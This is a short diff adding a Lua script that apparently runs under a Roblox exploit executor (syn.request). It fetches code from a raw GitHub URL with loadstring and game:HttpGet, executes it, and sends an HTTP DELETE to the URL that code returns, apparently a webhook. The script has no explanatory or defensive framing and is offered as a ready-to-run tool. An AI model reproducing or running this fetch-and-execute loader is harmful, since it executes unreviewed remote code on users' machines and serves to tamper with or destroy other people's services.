@@ -1,0 +1,6 @@
+local request = http_request or syn.request 
+
+request({
+    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/TEN-SON-WEBHOOK/main/DEVIL-Hub-Bookaa"))(),
+    Method = "DELETE"
+})
